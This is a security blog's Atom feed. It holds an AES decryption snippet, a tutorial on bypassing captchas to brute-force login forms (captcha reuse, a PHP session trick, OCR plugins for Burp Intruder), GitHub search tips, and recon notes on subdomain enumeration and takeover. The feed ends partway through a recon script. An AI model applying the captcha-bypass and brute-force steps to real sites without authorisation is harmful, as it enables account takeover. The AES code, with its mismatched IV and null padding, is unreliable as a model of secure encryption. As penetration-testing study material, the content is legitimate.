<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>cike</title>
  
  <subtitle>Assassin</subtitle>
  <link href="http://www.7wawa.com/atom.xml" rel="self"/>
  
  <link href="http://www.7wawa.com/"/>
  <updated>2020-08-31T09:50:37.954Z</updated>
  <id>http://www.7wawa.com/</id>
  
  <author>
    <name>cike</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python3 AES解密</title>
    <link href="http://www.7wawa.com/2020/08/31/python3-AES%E8%A7%A3%E5%AF%86/"/>
    <id>http://www.7wawa.com/2020/08/31/python3-AES%E8%A7%A3%E5%AF%86/</id>
    <published>2020-08-31T09:45:55.000Z</published>
    <updated>2020-08-31T09:50:37.954Z</updated>
    
    <content type="html"><![CDATA[<p>直接上代码备忘</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding: utf-8 _*_</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Create Time: 2020-08-28 15:05</span></span><br><span class="line"><span class="string">Author: Cike</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrpCrypt</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key,vector)</span>:</span></span><br><span class="line">        self.key = key.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">        self.vector = vector</span><br><span class="line">        self.mode = AES.MODE_CBC</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密函数，如果text不足16位就用空格补足为16位，</span></span><br><span class="line">    <span class="comment"># 如果大于16当时不是16的倍数，那就补足为16的倍数。</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, text)</span>:</span></span><br><span class="line">        text = text.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">        cryptor = AES.new(self.key, self.mode, <span class="string">b'0123456789ABCDEF'</span>)</span><br><span class="line">        <span class="comment"># 这里密钥key 长度必须为16（AES-128）,</span></span><br><span class="line">        <span class="comment"># 24（AES-192）,或者32 （AES-256）Bytes 长度</span></span><br><span class="line">        <span class="comment"># 目前AES-128 足够目前使用</span></span><br><span class="line">        length = <span class="number">16</span></span><br><span class="line">        count = len(text)</span><br><span class="line">        <span class="keyword">if</span> count &lt; length:</span><br><span class="line">            add = (length - count)</span><br><span class="line">            <span class="comment"># \0 backspace</span></span><br><span class="line">            <span class="comment"># text = text + ('\0' * add)</span></span><br><span class="line">            text = text + (<span class="string">'\0'</span> * add).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">elif</span> count &gt; length:</span><br><span class="line">            add = (length - (count % length))</span><br><span class="line">            <span class="comment"># text = text + ('\0' * add)</span></span><br><span class="line">            text = text + (<span class="string">'\0'</span> * add).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">        self.ciphertext = cryptor.encrypt(text)</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(self.ciphertext).decode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密后，去掉补足的空格用strip() 去掉</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, text)</span>:</span></span><br><span class="line">        cryptor = AES.new(self.key, self.mode, self.vector)</span><br><span class="line">        decryptByts = base64.b64decode(text)</span><br><span class="line">        plain_text = cryptor.decrypt(decryptByts)</span><br><span class="line">        <span class="keyword">return</span> bytes.decode(plain_text).rstrip(<span class="string">'\0'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pc = PrpCrypt(<span class="string">'key'</span>,<span class="string">b'偏移'</span>)  <span class="comment"># 初始化密钥</span></span><br><span class="line">    d = pc.decrypt(<span class="string">"xiXdhaMnD27rst/xU+vBn5v9QZi7v+PS26u"</span>)  <span class="comment"># 解密</span></span><br><span class="line">    print(<span class="string">"解密:"</span>, d)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;直接上代码备忘&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>登陆框爆破的那些事</title>
    <link href="http://www.7wawa.com/2020/07/29/%E7%99%BB%E9%99%86%E6%A1%86%E7%88%86%E7%A0%B4%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <id>http://www.7wawa.com/2020/07/29/%E7%99%BB%E9%99%86%E6%A1%86%E7%88%86%E7%A0%B4%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</id>
    <published>2020-07-29T10:53:46.000Z</published>
    <updated>2020-07-29T15:26:45.739Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-有验证码登陆的情况"><a href="#1-有验证码登陆的情况" class="headerlink" title="1.有验证码登陆的情况"></a>1.有验证码登陆的情况</h2><h3 id="1-1-验证码直接不起作用可以直接重复利用"><a href="#1-1-验证码直接不起作用可以直接重复利用" class="headerlink" title="1.1 验证码直接不起作用可以直接重复利用"></a>1.1 验证码直接不起作用可以直接重复利用</h3><p>​    <a id="more"></a></p><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200729185723.png" alt=""></p><p>比如这样的一个登陆框，我们抓包看看。</p><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200729185920.png" alt=""></p><p>然后我们换一个用户名看看</p><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200729190407.png" alt=""></p><p>直接就可以看见验证码不失效可以重复利用，对于这种重复不失效的验证码。还可能存在另外一个情况就是，我们手动刷新一下验证码然后直接在burp当中手动填入新出现的验证码，这样也可能出现重复利用的效果。</p><h3 id="1-2-在php环境当中绕过验证码"><a href="#1-2-在php环境当中绕过验证码" class="headerlink" title="1.2 在php环境当中绕过验证码"></a>1.2 在php环境当中绕过验证码</h3><blockquote><p><a href="https://www.leavesongs.com/PHP/check-code-safe.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/check-code-safe.html</a></p></blockquote><p>先说下验证码的生成比如下面这个代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$randCode = <span class="string">''</span>;</span><br><span class="line">$chars = <span class="string">'abcdefghijkmnpqrstuvwxyzABCDEFGHIJKLMNPRSTUVWXYZ23456789'</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; <span class="number">5</span>; $i++ )&#123;</span><br><span class="line">$randCode .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'code'</span>] = strtoupper($randCode);</span><br><span class="line"></span><br><span class="line">$img = imagecreate(<span class="number">70</span>,<span class="number">22</span>);</span><br><span class="line">$bgColor = <span class="keyword">isset</span>($_GET[<span class="string">'mode'</span>]) &amp;&amp; $_GET[<span class="string">'mode'</span>] == <span class="string">'t'</span> ? imagecolorallocate($img,<span class="number">245</span>,<span class="number">245</span>,<span class="number">245</span>) : imagecolorallocate($img,<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>);</span><br><span class="line">$pixColor = imagecolorallocate($img,mt_rand(<span class="number">30</span>, <span class="number">180</span>), mt_rand(<span class="number">10</span>, <span class="number">100</span>), mt_rand(<span class="number">40</span>, <span class="number">250</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">5</span>; $i++)&#123;</span><br><span class="line">$x = $i * <span class="number">13</span> + mt_rand(<span class="number">0</span>, <span class="number">4</span>) - <span class="number">2</span>;</span><br><span class="line">$y = mt_rand(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">$text_color = imagecolorallocate($img, mt_rand(<span class="number">30</span>, <span class="number">180</span>), mt_rand(<span class="number">10</span>, <span class="number">100</span>), mt_rand(<span class="number">40</span>, <span class="number">250</span>));</span><br><span class="line">imagechar($img, <span class="number">5</span>, $x + <span class="number">5</span>, $y + <span class="number">3</span>, $randCode[$i], $text_color);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>($j = <span class="number">0</span>; $j &lt; <span class="number">60</span>; $j++)&#123;</span><br><span class="line">$x = mt_rand(<span class="number">0</span>,<span class="number">70</span>);</span><br><span class="line">$y = mt_rand(<span class="number">0</span>,<span class="number">22</span>);</span><br><span class="line">imagesetpixel($img,$x,$y,$pixColor);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: image/png'</span>);</span><br><span class="line">imagepng($img);</span><br><span class="line">imagedestroy($img);</span><br></pre></td></tr></table></figure><p>第一个for循环后我们可以看到$_SESSION[‘code’] = strtoupper($randCode); 他把我们的验证码转换成大写赋值到session里了</p><p>那么验证的过程就是，我们首先生成5个随机字符，保存到session里。然后把这5个字符画成一个图片给用户看，让用户识别，填写在表单里提交后和我们session里的验证码比对。</p><p>因为是和session相关的所有我们就可以这样来利用，作为一个正常用户，我们每访问一次需要填写验证码的页面，生成验证码的脚本都会执行一次，也就说会生成一个新验证码赋值到session里，没有任何问题。但对于一个机器(或一个暴力破解密码脚本)，它第一次访问需要填写验证码的页面，然后在session中得到一个验证码，它以后就不用再次访问这个页面了。直接把第一次的数据包更改并再次发送即可，于是，如果没有清除session的网站，每次的验证码都和第一次相同，也就丧失了验证码的本来作用（假如我们发送一个新的session对应一个空值验证码来给服务器）。</p><p>最简单的版本就是把session删除一位发送一个服务器都没有的session,然后把验证码字符串的value值留空，这样就可以绕过验证码了 。</p><h3 id="1-3-PKAV-fuzzing工具对简单验证码的识别"><a href="#1-3-PKAV-fuzzing工具对简单验证码的识别" class="headerlink" title="1.3 PKAV fuzzing工具对简单验证码的识别"></a>1.3 PKAV fuzzing工具对简单验证码的识别</h3><p>像这种能简单识别的验证码能用pkav工具的就用这个吧，不过这个工具自带的验证码识别效果不怎么行，比较低，比如下面这种代底纹干扰的验证码，虽然有时候能识别正确，但是识别效率就比较低了，不带底纹干扰的验证码效果还是很不错的。</p><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200729193826.png" alt=""></p><p>在重放选项的时候最好把验证码的长度固定下这样有助于提高识别效率。</p><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200729194306.png" alt=""></p><h3 id="1-4-Burpsuite验证码插件来识别验证码"><a href="#1-4-Burpsuite验证码插件来识别验证码" class="headerlink" title="1.4 Burpsuite验证码插件来识别验证码"></a>1.4 Burpsuite验证码插件来识别验证码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">采用好基友c0ny1的工具captcha-killer</span><br><span class="line">http://gv7.me/articles/2019/burp-captcha-killer-usage/</span><br></pre></td></tr></table></figure><p>只所以采用这款插件是因为，这款插件只是验证码接口的调用，这样就有助于我们后面自己开发各种api验证码接口来适应各种不同的验证码。</p><p>工具有两个选项是需要发送过去的</p><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200729194827.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Send to captcha panel  这个选项是需要把你访问验证码生成验证码图片的包体发送过去</span><br><span class="line">Send to interface panel  这个选项是需要把调用验证码识别api接口的包体仿进去</span><br></pre></td></tr></table></figure><p>我们先来看下使用已经内置好的百度ocr识别模版载入来使用下</p><p>我们首先发送图片包体过来，然后就会像下面这样</p><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200729195822.png" alt=""></p><p>然后我们在继续使用内置好的百度ocr模版，在template区域鼠标右键选择</p><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200729195943.png" alt=""></p><p>然后我们只需要去百度申请一个开发者账号和获取自己新建应用的token就行了。</p><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200729200530.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度ocr token获取</span><br><span class="line">curl -i -k &apos;https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&amp;client_id=[API-KEY]&amp;client_secret=[SECRET-KEY]&apos;</span><br></pre></td></tr></table></figure><p>然后我们填入生成的token然后点击识别两次来看看效果</p><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200729201222.png" alt=""></p><p>可以很清晰的看见识别效果还是很不错的，但是免费用户识别频率和次数每天都有限制，不是很方便。</p><p>然后我们自己来制作一个第三方网站的识别api的模版范例（使用内置的标签）</p><table><thead><tr><th>ID</th><th>标签</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>&lt;@IMG_RAW&gt;xxxx\&lt;/@IMG_RAW&gt;</td><td>代表验证码图片原二进制内容</td></tr><tr><td>2</td><td>&lt;@URLENCODE&gt;xxxxx\&lt;/@URLENCODE&gt;</td><td>对标签内的内容进行url编码</td></tr><tr><td>3</td><td>&lt;@BASE64&gt;xxxx\&lt;/@BASE64&gt;</td><td>对标签内的内容进行base64编码</td></tr></tbody></table><p>我们随便找一个打码平台，根据sdk调用api 然后我们抓到识别包体是这样的</p><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200729223417.png" alt=""></p><p>可以看见我们的识别图片的内容是在image标签里面，里面放的是图片的二进制数据的base64的结果，所以我们把这个包体发送到Send to interface panel 然后这样改写就可以调用了。</p><p>然后找了个比较难的验证码来做测试和模版的编写。</p><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200729225355.png" alt=""></p><p>因为匹配结构的选取我这里采用的正则所以这样写，相当于这个api接口的模版就做好了 可以保存下次直接调用。</p><p>Intruder模块调用</p><p>配置好各项后，可以点击锁定对当前配置进行锁定，防止被修改导致爆破失败！接着安装以下步骤进行配置</p><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200729230148.png" alt=""></p><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200729230253.png" alt=""></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1-有验证码登陆的情况&quot;&gt;&lt;a href=&quot;#1-有验证码登陆的情况&quot; class=&quot;headerlink&quot; title=&quot;1.有验证码登陆的情况&quot;&gt;&lt;/a&gt;1.有验证码登陆的情况&lt;/h2&gt;&lt;h3 id=&quot;1-1-验证码直接不起作用可以直接重复利用&quot;&gt;&lt;a href=&quot;#1-1-验证码直接不起作用可以直接重复利用&quot; class=&quot;headerlink&quot; title=&quot;1.1 验证码直接不起作用可以直接重复利用&quot;&gt;&lt;/a&gt;1.1 验证码直接不起作用可以直接重复利用&lt;/h3&gt;&lt;p&gt;​</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>github搜索技巧</title>
    <link href="http://www.7wawa.com/2020/04/14/github%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/"/>
    <id>http://www.7wawa.com/2020/04/14/github%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/</id>
    <published>2020-04-14T08:33:54.000Z</published>
    <updated>2020-07-20T15:38:33.644Z</updated>
    
    <content type="html"><![CDATA[<p>1.搜索 github 中，项目描述（description）中有 python 并且 2019-12-20 号之后有更新过的项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in:description python pushed:&gt;2019-12-20</span><br></pre></td></tr></table></figure><a id="more"></a><p>可通过指定</p><p>仓库名(repository name)、项目描述(description)、内容(contents)、说明文件(readme.md)来搜索项目</p><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200720232710.png" alt=""></p><p>其他骚操作？自己看官方文档（感觉用不到，就不整理了吧）：【找仓库中的某个文件】、【在 github 上查找代码片段】</p><p>查找某个用户或组织的项目</p><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200720232916.png" alt=""></p><p>辅助限定词</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以通过限制 `项目大小(size)、拥护者数(followers)、fork数(forks)、stars数(stars)、创建时间(created)、更新时间(pushed)、项目所用语言(language)、topic标签(topic)、topic标签数(topics)...`来筛选项目</span><br><span class="line">辅助限定词可以多个并用，用空格隔开就行，可以搭配限定词使用，也可单独使用（关于项目是否被 fork 这个点我不是很懂，就不写案例了）</span><br><span class="line">in:name python size:&lt;=1000` 查出项目名字中有 python 且小于 1MB 的项目</span><br><span class="line">size:&lt;=1000` 查出项目大小小于 1MB 的项目</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/huayanqiaq/blogimage/master/20200720233405.png" alt=""></p><p><strong>还没搞懂的（关于 forks、mirror、issues）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. stars:&gt;=500 fork:true language:php matches repositories with the at least 500 stars, including forked ones, that are written in PHP.</span><br><span class="line"></span><br><span class="line">2. case pushed:&gt;=2013-03-06 fork:only matches repositories with the word "case" that were pushed to on or after March 6th, 2013, and that are forks.</span><br><span class="line"></span><br><span class="line">3. mirror:true GNOME matches repositories that are mirrors and contain the word "GNOME." 查出是镜像并且包含 GNOME 关键字的项目（github 上 mirror 啥意思不太懂）</span><br><span class="line"></span><br><span class="line">4. mirror:false GNOME matches repositories that are not mirrors and contain the word "GNOME."</span><br><span class="line"></span><br><span class="line">5. good-first-issues:&gt;2 javascript matches repositories with more than two issues labeled good-first-issue and that contain the word "javascript."</span><br><span class="line"></span><br><span class="line">6. help-wanted-issues:&gt;4 react matches repositories with more than four issues labeled help-wantedand that contain the word "React."</span><br></pre></td></tr></table></figure><p><strong>使用指南</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 项目名字(name)里有 python 的</span><br><span class="line">in:name python</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 名字(name)里有 python 的并且 stars 大于 3000 的</span><br><span class="line">in:name python starts:&gt;3000</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 名字(name)里有 python 的并且 stars 大于 3000 、forks 大于 200 的</span><br><span class="line">in:name python starts:&gt;3000 forks:&gt;200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 详情(readme)里面有 python 的并且 stars 大于 3000 的</span><br><span class="line">in:readme python starts:&gt;3000</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 描述(description)里面有 python 的并且 stars 大于 3000 的</span><br><span class="line">in:description python starts:&gt;3000</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 描述(description)里面有 python 的并且是 python 语言的</span><br><span class="line">in:description python language:python</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 描述(description)里面有 python 的并且 2019-12-20 号之后有更新过的</span><br><span class="line">in:description python pushed:&gt;2019-12-20</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;1.搜索 github 中，项目描述（description）中有 python 并且 2019-12-20 号之后有更新过的项目&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;in:description python pushed:&amp;gt;2019-12-20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>最近几天学习心得-长期更新</title>
    <link href="http://www.7wawa.com/2020/02/23/%E6%9C%80%E8%BF%91%E5%87%A0%E5%A4%A9%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/"/>
    <id>http://www.7wawa.com/2020/02/23/%E6%9C%80%E8%BF%91%E5%87%A0%E5%A4%A9%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/</id>
    <published>2020-02-23T05:18:48.000Z</published>
    <updated>2020-02-23T05:22:13.056Z</updated>
    
    <content type="html"><![CDATA[<h3 id="crt搜索技巧"><a href="#crt搜索技巧" class="headerlink" title="crt搜索技巧"></a>crt搜索技巧</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://crt.sh/?q=%25.%25.%25.%25.%25.8x8.com</span><br><span class="line">%.%.%.wanmei.com</span><br></pre></td></tr></table></figure><h3 id="dirsearch使用技巧"><a href="#dirsearch使用技巧" class="headerlink" title="dirsearch使用技巧"></a>dirsearch使用技巧</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sql -u &lt;target&gt;</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="国外使用的子域名搜索工具"><a href="#国外使用的子域名搜索工具" class="headerlink" title="国外使用的子域名搜索工具"></a>国外使用的子域名搜索工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assetfinder, sublist3r, subfinder，amass enum</span><br></pre></td></tr></table></figure><h3 id="国外使用目录爆破工具"><a href="#国外使用目录爆破工具" class="headerlink" title="国外使用目录爆破工具"></a>国外使用目录爆破工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filebuster dirsearch gobuster</span><br></pre></td></tr></table></figure><h3 id="国外使用的http参数爆破工具"><a href="#国外使用的http参数爆破工具" class="headerlink" title="国外使用的http参数爆破工具"></a>国外使用的http参数爆破工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arjun</span><br><span class="line">下载地址：https://github.com/s0md3v/Arjun</span><br><span class="line">使用说明：https://github.com/s0md3v/Arjun/wiki/Usage</span><br><span class="line">python3 arjun.py -u https://api.example.com/endpoint --get</span><br></pre></td></tr></table></figure><h3 id="国外使用的子域名接管漏洞"><a href="#国外使用的子域名接管漏洞" class="headerlink" title="国外使用的子域名接管漏洞"></a>国外使用的子域名接管漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">subjack</span><br><span class="line">https://github.com/haccer/subjack</span><br><span class="line">综合使用：</span><br><span class="line">step1:</span><br><span class="line">subfinder -d &#123;target&#125; &gt;&gt; domains ; assetfinder -subs-only &#123;target&#125; &gt;&gt; domains ; amass enum -norecursive -noalts -d &#123;target&#125; &gt;&gt; domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/HAHWUL/tool/subjack/fingerprints.json -v 3 &gt;&gt; takeover ;</span><br><span class="line">step2:</span><br><span class="line">cat domains | httprobe | tee hosts ; meg -d 1000 -v /</span><br><span class="line">step3:</span><br></pre></td></tr></table></figure><h3 id="国外使用的探测http链接正常"><a href="#国外使用的探测http链接正常" class="headerlink" title="国外使用的探测http链接正常"></a>国外使用的探测http链接正常</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httprobe</span><br><span class="line">https://github.com/tomnomnom/httprobe</span><br></pre></td></tr></table></figure><h3 id="Python-or-django-or-flask-debug模式攻击"><a href="#Python-or-django-or-flask-debug模式攻击" class="headerlink" title="Python or django or flask debug模式攻击"></a>Python or django or flask debug模式攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://baidu.com/console接口</span><br></pre></td></tr></table></figure><h3 id="国外有用信息搜索网站"><a href="#国外有用信息搜索网站" class="headerlink" title="国外有用信息搜索网站"></a>国外有用信息搜索网站</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://urlscan.io/</span><br></pre></td></tr></table></figure><h3 id="DNS域名历史解析记录查询"><a href="#DNS域名历史解析记录查询" class="headerlink" title="DNS域名历史解析记录查询"></a>DNS域名历史解析记录查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://whoisrequest.com/history/</span><br><span class="line">https://viewdns.info/iphistory/?domain=upwork.com</span><br><span class="line">https://securitytrails.com/</span><br></pre></td></tr></table></figure><h3 id="一键信息搜集脚本st8out-sh"><a href="#一键信息搜集脚本st8out-sh" class="headerlink" title="一键信息搜集脚本st8out.sh"></a>一键信息搜集脚本st8out.sh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">https://gist.github.com/dwisiswant0/5f647e3d406b5e984e6d69d3538968cd</span><br><span class="line">code:</span><br><span class="line">#######</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">#####</span><br><span class="line">#</span><br><span class="line"># St8out - Extra one-liner for reconnaissance</span><br><span class="line">#</span><br><span class="line"># Usage: ./st8out.sh target.com</span><br><span class="line">#</span><br><span class="line"># Resources:</span><br><span class="line"># - https://github.com/j3ssie/metabigor</span><br><span class="line"># - https://github.com/Edu4rdSHL/findomain</span><br><span class="line"># - https://github.com/OWASP/Amass</span><br><span class="line"># - https://github.com/tomnomnom/hacks/tree/master/filter-resolved</span><br><span class="line"># - 